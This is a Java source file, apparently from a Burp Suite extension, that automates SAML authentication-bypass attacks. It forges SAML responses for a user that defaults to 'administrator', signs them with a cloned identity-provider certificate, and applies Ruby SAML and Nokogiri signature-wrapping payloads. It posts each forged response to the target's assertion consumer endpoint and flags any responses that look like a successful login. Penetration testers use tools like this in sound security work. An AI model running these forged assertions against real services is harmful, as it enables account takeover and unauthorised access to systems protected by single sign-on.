package burp.executors;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.core.Annotations;
import burp.api.montoya.core.ByteArray;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.StatusCodeClass;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.params.HttpParameterType;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.requests.MalformedRequestException;
import burp.models.*;
import burp.utilities.exceptions.SAMLException;
import burp.utilities.helpers.*;
import burp.wrappers.RubyNokogiriATTLIST;
import burp.wrappers.RubyNokogiriAttributePollution;
import burp.wrappers.RubyNokogiriAttributePollutionExtension;
import burp.wrappers.RubySAMLVoidWrapper;
import org.apache.xml.security.signature.XMLSignature;
import org.w3c.dom.Document;

import javax.xml.crypto.dsig.DigestMethod;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.security.cert.CertificateFactory;
import java.security.cert.X509Certificate;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.Objects;

import static burp.utilities.helpers.Constants.HTTP_POST_BINDING;

public class WrapTask implements Runnable {

    private final XMLHelpers xmlHelpers = XMLHelpers.getInstance();
    private final TaskContext context;
    private final MontoyaApi montoyaApi;
    private final List<HttpRequestResponse> requestResponses;
    private final TaskManager manager;
    private Document cachedMetadata;

    public WrapTask(TaskManager manager, List<HttpRequestResponse> requestResponses) {
        this.manager = manager;
        this.context = manager.getContext();
        this.montoyaApi = manager.getMontoyaApi();
        this.requestResponses = requestResponses;
    }

    public static String toStringWithoutBom(byte[] bytes) {
        if (bytes == null) {
            return null;
        }

        byte[] bom = new byte[]{(byte) 0xEF, (byte) 0xBB, (byte) 0xBF};

        if (bytes.length >= bom.length &&
                bytes[0] == bom[0] && bytes[1] == bom[1] && bytes[2] == bom[2]) {
            return new String(bytes, bom.length, bytes.length - bom.length, StandardCharsets.UTF_8);
        }

        return new String(bytes, StandardCharsets.UTF_8);
    }

    @Override
    public void run() {
        try {
            montoyaApi.logging().logToOutput("Processing " + requestResponses.size() + " requests");

            for (HttpRequestResponse requestResponse : requestResponses) {
                processSAMLRequest(requestResponse);
            }

            montoyaApi.logging().logToOutput("Task completed successfully");
        } catch (Exception e) {
            montoyaApi.logging().logToError("Error processing SAML: " + e.getMessage());
            throw new RuntimeException(e);
        }
    }

    private Document refreshMetadata(String uri) {
        if (cachedMetadata != null && !context.isRefresh()) {
            return cachedMetadata;
        }

        HttpRequestResponse metadataRequest = montoyaApi
                .http()
                .sendRequest(HttpRequest.httpRequestFromUrl(uri));

        if (metadataRequest.hasResponse()) {
            ByteArray body = metadataRequest.response().body();
            try {
                String str = toStringWithoutBom(body.getBytes());
                Document xmlDoc = xmlHelpers.getXMLDocumentOfSAMLMessage(str);
                SAMLMetadataDocument metadataDocument = new SAMLMetadataDocument(xmlDoc);
                cachedMetadata = metadataDocument.getDocument();
            } catch (SAMLException e) {
                montoyaApi.logging().logToError("Failed to refresh metadata: " + e.getLocalizedMessage());
            }
        }

        return cachedMetadata;
    }

    private void applyWrapper(List<ByteBuffer> wraps, Document doc, String metadataURI,
                              WrapperFunction wrapper, String wrapperName) {
        try {
            Document metadata = refreshMetadata(metadataURI);
            if (metadata == null) {
                montoyaApi.logging().logToError("Failed to fetch metadata for " + wrapperName);
                return;
            }
            String result = wrapper.apply(doc, metadata);
            wraps.add(ByteBuffer.wrap(result.getBytes(StandardCharsets.UTF_8)));
        } catch (Exception e) {
            montoyaApi.logging().logToError("Error applying " + wrapperName + ": " + e.getMessage());
        }
    }

    private void processSAMLRequest(HttpRequestResponse requestResponse) {
        // Check if still alive
        HttpRequestResponse baselineRequestResponse = montoyaApi.http().sendRequest(requestResponse.request());

        if (baselineRequestResponse.response() == null) {
            return;
        }

        String destination = null;
        String requestString;
        List<HttpParameter> cookies = new ArrayList<>();
        if (baselineRequestResponse.request().hasParameter("SAMLRequest", HttpParameterType.URL)) {
            requestString = baselineRequestResponse.request().parameterValue("SAMLRequest");
            cookies = baselineRequestResponse.request().parameters().stream()
                    .filter(parsedHttpParameter -> parsedHttpParameter.type() == HttpParameterType.COOKIE)
                    .map(parsedHttpParameter -> HttpParameter.cookieParameter(
                            parsedHttpParameter.name(), parsedHttpParameter.value()
                    ))
                    .toList();
            destination = baselineRequestResponse.request().url();
        } else {
            String body = baselineRequestResponse.response().bodyToString();
            if (baselineRequestResponse.response().isStatusCodeClass(StatusCodeClass.CLASS_3XX_REDIRECTION)) {
                body = baselineRequestResponse.response().headerValue("Location");
                destination = body;
            }

            int start = body.toLowerCase().indexOf("samlrequest=");
            if (start >= 0) {
                int end = body.indexOf("&", start);
                end = end == -1 ? body.length() : end;
                requestString = body.substring(start + "SAMLRequest=".length(), end);

            } else {
                start = body.toLowerCase().indexOf("samlrequest%");
                int end = body.indexOf("%26", start);
                end = end == -1 ? body.length() : end;
                requestString = body.substring(start + "SAMLRequest%3D".length(), end);
            }
            cookies = baselineRequestResponse.response().cookies().stream()
                    .map(cookie -> HttpParameter.cookieParameter(
                            cookie.name(), cookie.value()
                    ))
                    .toList();
        }

        if (requestString == null) {
            montoyaApi.logging().logToOutput("SAMLRequest wasn't found not in Response");
            return;
        }

        try {
            String decodedSAML = EncodingHelpers.decode(requestString);
            Document authnRequestDoc = xmlHelpers.getXMLDocumentOfSAMLMessage(decodedSAML);
            SAMLAuthnRequestDocument authnRequest = new SAMLAuthnRequestDocument(authnRequestDoc);

            if (authnRequest.getProtocolBinding() != null &&
                    !HTTP_POST_BINDING.equalsIgnoreCase(authnRequest.getProtocolBinding())) {
                montoyaApi.logging().logToError("WARNING! AuthnRequest requires different Protocol Binding!");
                montoyaApi.logging().logToError(authnRequest.getProtocolBinding());
            }

            String authnRequestDestination = authnRequest.getDestination();
            if (authnRequestDestination != null) destination = authnRequestDestination;
            String metadataURI = null;

            if (context.getMetadataURL() != null && !context.getMetadataURL().isBlank())
                metadataURI = context.getMetadataURL();
            else if (destination != null) {
                montoyaApi.logging().logToOutput("SAMLRequest Authn Destination " + destination);
                metadataURI = manager.extractSAMLMetadata(destination);
            }

            List<ByteBuffer> wraps = new ArrayList<>();

            String canary = montoyaApi.utilities().randomUtils().randomString(8);
            try {
                SAMLResponseBuilder fuzzBuilder = new SAMLResponseBuilder(authnRequest);
                Document doc = fuzzBuilder.withDefaultAttributes()
                        .withResponseID(canary)
                        .withAssertionID(canary)
                        .withIssuer(canary)
                        .withDestination(canary)
                        .withAudience(canary)
                        .withNameId(canary)
                        .withNameIdFormat(canary)
                        .withSessionIndex(canary)
                        .withStatusCode(canary)
                        .withStatusMessage(canary)
                        .withAuthInstant(canary)
                        .withIssueInstant(canary)
                        .withNotBefore(canary)
                        .withNotOnOrAfter(canary)
                        .build();
                String fuzz = xmlHelpers.getString(doc);
                fuzz = Utilities.replaceWithIncrementingId(fuzz, canary);
                wraps.add(ByteBuffer.wrap(fuzz.getBytes(StandardCharsets.UTF_8)));
            } catch (Exception ignored) {
            }

            if (metadataURI != null && !metadataURI.isBlank()) {
                try {
                    Document metadata = refreshMetadata(metadataURI);
                    if (metadata == null) {
                        throw new SAMLException("Failed to fetch metadata for " + metadataURI);
                    }
                    SAMLMetadataDocument metadataDocument = new SAMLMetadataDocument(
                            metadata
                    );
                    SAMLResponseBuilder builder = new SAMLResponseBuilder(authnRequest);

                    String nameId = Objects.requireNonNullElse(context.getNameId(),
                            "administrator"
                    );
                    byte[] certBytes = Base64.getDecoder().decode(metadataDocument.getX509Certificate());
                    CertificateFactory certFactory = CertificateFactory.getInstance("X.509");
                    X509Certificate x509certificate = (X509Certificate) certFactory.generateCertificate(new ByteArrayInputStream(certBytes));

                    BurpCertificate originalCertificate = new BurpCertificate(x509certificate);
                    originalCertificate.setPublicKey(x509certificate.getPublicKey());
                    originalCertificate.setSource("SAML Metadata");

                    BurpCertificate clonedCertificate = CertificateHelper.cloneCertificate(originalCertificate,
                            new BurpCertificateBuilder(originalCertificate.getSubject()));

                    builder = builder.withIssuer(metadataDocument.getEntityID())
                            .withNameId(nameId)
                            .withDefaultAttributes();

                    if (context.getAssertionConsumerServiceURL() != null && !context.getAssertionConsumerServiceURL().isBlank()) {
                        builder = builder.withDestination(context.getAssertionConsumerServiceURL());
                    }

                    if (context.isSign()) {
                        try {
                            Document signedMessageDoc = builder.build();
                            Document signedAssertionDoc = builder.build();
                            Document unsignedDoc = builder.build();

                            xmlHelpers.signMessage(
                                    signedMessageDoc,
                                    XMLSignature.ALGO_ID_SIGNATURE_RSA_SHA256,
                                    DigestMethod.SHA256,
                                    clonedCertificate.getCertificate(),
                                    clonedCertificate.getPrivateKey()
                            );
                            String crt = xmlHelpers.getCertificate(signedMessageDoc.getDocumentElement()).replaceAll("\r?\n", "");
                            String fakeSignature = xmlHelpers.getStringWithoutNewLine(signedMessageDoc);
                            String oracleSignature = fakeSignature.replace(crt, metadataDocument.getX509Certificate());

                            xmlHelpers.signAssertion(
                                    signedAssertionDoc,
                                    XMLSignature.ALGO_ID_SIGNATURE_RSA_SHA256,
                                    DigestMethod.SHA256,
                                    clonedCertificate.getCertificate(),
                                    clonedCertificate.getPrivateKey()
                            );

                            String crtA = xmlHelpers.getCertificate(signedAssertionDoc.getDocumentElement()).replaceAll("\r?\n", "");
                            String fakeSignatureA = xmlHelpers.getStringWithoutNewLine(signedAssertionDoc);
                            String oracleSignatureA = fakeSignatureA.replace(crtA, metadataDocument.getX509Certificate());

                            wraps.add(ByteBuffer.wrap(fakeSignature.getBytes(StandardCharsets.UTF_8)));
                            wraps.add(ByteBuffer.wrap(oracleSignature.getBytes(StandardCharsets.UTF_8)));

                            wraps.add(ByteBuffer.wrap(fakeSignatureA.getBytes(StandardCharsets.UTF_8)));
                            wraps.add(ByteBuffer.wrap(oracleSignatureA.getBytes(StandardCharsets.UTF_8)));

                            wraps.add(ByteBuffer.wrap(xmlHelpers.getString(unsignedDoc).getBytes(StandardCharsets.UTF_8)));

                        } catch (Exception e) {
                            montoyaApi.logging().logToError(e.getLocalizedMessage());
                        }
                    }

                    if (metadataDocument.isSigned()) {
                        Document doc = builder
                                .withSignature(metadataDocument.getSignature())
                                .build();

                        applyWrapper(wraps, doc, metadataURI, RubySAMLVoidWrapper::apply, "Void Wrapper");
                        applyWrapper(wraps, doc, metadataURI, RubyNokogiriATTLIST::apply, "Nokogiri ATTLIST");
                        applyWrapper(wraps, doc, metadataURI, RubyNokogiriAttributePollution::apply, "Nokogiri Attribute Pollution");
                        applyWrapper(wraps, doc, metadataURI, RubyNokogiriAttributePollutionExtension::apply, "Nokogiri Attribute Pollution Extension");
                    }
                } catch (Exception exception) {
                    montoyaApi.logging().logToError(exception.getLocalizedMessage());
                }
            }

            String url = authnRequest.getAssertionConsumerServiceURL();
            if (url == null) url = context.getAssertionConsumerServiceURL();
            if (url == null || url.isBlank()) throw new SAMLException("Couldn't find the Destination URL");
            HttpRequest postRequest = HttpRequest.httpRequestFromUrl(url);
            postRequest.url();
            HttpRequest finalRequest = postRequest
                    .withMethod("POST");
            HttpRequestResponse failResponse = montoyaApi.http().sendRequest(finalRequest.withAddedParameters(
                    HttpParameter.bodyParameter("SAMLResponse", EncodingHelpers.encodeSamlParam(
                                    "<?xml version=\"1.0\" encoding=\"UTF-8\"?><Response/>".getBytes(StandardCharsets.UTF_8),
                                    false,
                                    true,
                                    true
                            )
                    )
            ));

            if (!failResponse.hasResponse()) return;
            for (ByteBuffer response : wraps) {
                Thread.sleep(context.getTimeout());
                HttpRequest probRequest = finalRequest
                        .withAddedParameters(cookies)
                        .withAddedParameters(HttpParameter.bodyParameter(
                                "SAMLResponse", EncodingHelpers.encodeSamlParam(
                                        response.array(),
                                        false,
                                        true,
                                        true
                                )));


                ResponseGroup responseGroup = new ResponseGroup(MontoyaHelpers::calculateFingerprint);
                responseGroup.add(failResponse.response());

                HttpRequestResponse probResponse = montoyaApi.http().sendRequest(probRequest);

                if (probResponse.hasResponse()) {
                    if (!responseGroup.matches(probResponse.response())) {
                        montoyaApi.organizer().sendToOrganizer(
                                probResponse.withAnnotations(
                                        Annotations.annotations().withNotes(
                                                responseGroup.describeDiff(probResponse.response())
                                        )
                                )
                        );
                    } else if (probResponse.response().toString().contains(canary)) {
                        montoyaApi.organizer().sendToOrganizer(
                                probResponse.withAnnotations(
                                        Annotations.annotations().withNotes(String.format(
                                                "Canary %s string was found in response.", canary))
                                )
                        );
                    }
                }
            }

        } catch (SAMLException | MalformedRequestException exception) {
            montoyaApi.logging().logToError(exception.getLocalizedMessage());
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
    }

    @FunctionalInterface
    private interface WrapperFunction {
        String apply(Document doc, Document metadata) throws IOException, SAMLException;
    }
}
